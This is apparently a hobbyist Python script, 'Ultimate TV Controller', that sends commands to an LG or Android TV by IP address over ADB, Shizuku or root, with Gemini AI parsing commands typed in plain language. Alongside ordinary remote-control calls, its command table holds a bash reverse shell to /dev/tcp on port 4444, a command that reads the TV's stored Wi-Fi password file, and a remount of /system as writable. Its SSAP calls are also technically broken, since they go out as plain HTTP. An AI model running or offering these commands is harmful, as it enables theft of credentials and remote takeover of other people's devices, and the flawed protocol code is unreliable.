#!/usr/bin/env python3
"""
Ultimate TV Controller v6.0 - Shizuku/Root/ADB + Gemini AI
LG TV Optimized | GitHub Ready
"""
import os
import sys
import json
import re
import socket
import requests
import subprocess
from urllib.parse import quote

print("🤖 Ultimate TV Controller v6.0")
print("=" * 60)

# ================================
# MODE SELECTOR
# ================================
print("\n🎯 ACCESS MODE:")
print("1️⃣  Shizuku (Wireless, Rootless)")
print("2️⃣  Rooted Termux") 
print("3️⃣  ADB Cable/Wireless")
print("4️⃣  Network Only (All TVs)")
mode = input("Choose (1-4): ").strip()

MODES = {
    "1": "shizuku",
    "2": "root", 
    "3": "adb",
    "4": "network"
}
ACCESS_MODE = MODES.get(mode, "network")

TARGET_IP = input("📺 LG TV IP: ").strip()

# ================================
# GEMINI AI ACTIVATION
# ================================
GEMINI_API_KEY = input("🔑 Gemini API Key (Enter for AI Magic): ").strip()
if GEMINI_API_KEY:
    try:
        import google.generativeai as genai
        genai.configure(api_key=GEMINI_API_KEY)
        model = genai.GenerativeModel('gemini-1.5-flash')
        AI_ACTIVE = True
        print("✨ Gemini AI ACTIVATED! Natural commands enabled.")
        
        # Gemini welcome message
        welcome = model.generate_content("Say something cool about hacking LG TVs with AI!")
        print(f"🤖 AI: {welcome.text}")
        
    except ImportError:
        print("⚠️ pip install google-generativeai")
        AI_ACTIVE = False
else:
    AI_ACTIVE = False
    print("⚠️ No AI - using keyword matching")

print(f"\n🎯 Mode: {ACCESS_MODE.upper()} | Target: {TARGET_IP} | AI: {'✅' if AI_ACTIVE else '❌'}")
print("=" * 60)

# ================================
# ULTIMATE HACK DATABASE
# ================================
HACKS = {
    # LG webOS Network (works everywhere)
    "power off": {"type": "network", "method": "ssap://system/turnOff"},
    "power on": {"type": "network", "method": "ssap://system/wakeup"},
    "volume up": {"type": "network", "method": "ssap://audio/volumeUp"},
    "volume max": {"type": "network", "method": "ssap://audio/setVolume", "params": {"volume": 100}},
    "mute": {"type": "network", "method": "ssap://audio/setMute", "params": {"mute": True}},
    "reboot": {"type": "network", "method": "ssap://system/reboot"},
    "home": {"type": "network", "method": "ssap://com.webos.app.launcher/launch"},
    "settings": {"type": "network", "method": "ssap://system.launcher/launch", "params": {"id": "settings"}},
    
    # Shizuku/ADB Commands
    "adb shell": {"type": "shell", "cmd": "shell"},
    "wifi passwords": {"type": "shell", "cmd": "shell cat /data/misc/wifi/WifiConfigStore.xml"},
    "apps list": {"type": "shell", "cmd": "shell pm list packages"},
    "cpu info": {"type": "shell", "cmd": "shell cat /proc/cpuinfo"},
    "reverse shell": {"type": "shell", "cmd": "shell 'bash -i >& /dev/tcp/192.168.1.1/4444 0>&1'"},
    
    # Root Commands  
    "root shell": {"type": "root", "cmd": "su"},
    "mount rw": {"type": "root", "cmd": "mount -o remount,rw /system"},
    
    # Fun
    "rickroll": {"type": "network", "method": "ssap://system.launcher/launch", "params": {"id": "youtube"}},
}

# ================================
# EXECUTION ENGINES
# ================================
def send_lg_api(method, params=None):
    """LG webOS SSAP API"""
    url = f"http://{TARGET_IP}:3000/"
    payload = {"method": method}
    if params: payload["params"] = params
    try:
        r = requests.post(url, json=payload, timeout=3)
        return r.status_code in [200, 204]
    except:
        return False

def execute_shell(cmd):
    """Shizuku/Root/ADB shell"""
    if ACCESS_MODE == "shizuku":
        full_cmd = f"shizuku adb connect {TARGET_IP} && shizuku adb {cmd}"
    elif ACCESS_MODE == "root":
        full_cmd = f"su -c 'adb connect {TARGET_IP} && adb {cmd}'"
    else:  # adb
        full_cmd = f"adb connect {TARGET_IP} && adb {cmd}"
    
    result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True)
    print(f"{'✅' if result.returncode == 0 else '❌'} {cmd.split()[0]}")
    if result.stdout: print(result.stdout[:300])
    return result.returncode == 0

def execute_root(cmd):
    """Root Termux commands"""
    result = subprocess.run(f"su -c '{cmd}'", shell=True, capture_output=True, text=True)
    print(f"{'👑' if result.returncode == 0 else '❌'} {cmd}")
    return result.returncode == 0

# ================================
# GEMINI AI PARSER
# ================================
def ai_parse(cmd):
    if not AI_ACTIVE:
        # Keyword fallback
        cmd_clean = cmd.lower().replace(" ", "")
        for key, hack in HACKS.items():
            if key.replace(" ", "") in cmd_clean:
                return hack
        return None
    
    # Gemini magic
    prompt = f"""Parse "{cmd}" into exact hack key from:
{list(HACKS.keys())}

Natural language → exact command. JSON: {{"hack": "power off"}}"""
    
    try:
        resp = model.generate_content(prompt)
        match = re.search(r'"([^"]+)"', resp.text)
        if match:
            key = match.group(1).lower()
            return HACKS.get(key)
    except:
        pass
    return None

# ================================
# MAIN LOOP
# ================================
def main():
    print("\n📱 Commands: power off, volume max, wifi passwords, rickroll...")
    print("🔧: list, test, quit")
    print("=" * 60)
    
    while True:
        cmd = input("📺> ").strip()
        
        if cmd.lower() in ["quit", "q", "exit"]:
            print("👋 TV offline")
            break
        elif cmd.lower() == "list":
            print("\n".join(f"  🎯 {k}" for k in HACKS.keys()))
        elif cmd.lower() == "test":
            if send_lg_api("ssap://system/info"): print("✅ LG webOS detected!")
            if subprocess.run("shizuku", capture_output=True).returncode == 0: print("✅ Shizuku ready!")
        else:
            hack = ai_parse(cmd) if AI_ACTIVE else None
            if not hack: hack = ai_parse(cmd)  # Fallback
            
            if hack:
                if hack["type"] == "network":
                    success = send_lg_api(hack["method"], hack.get("params"))
                    print(f"{'✅' if success else '❌'} LG API")
                elif hack["type"] == "shell":
                    execute_shell(hack["cmd"])
                elif hack["type"] == "root":
                    execute_root(hack["cmd"])
            else:
                print("❌ Unknown command. Try 'list'")

if __name__ == "__main__":
    main()
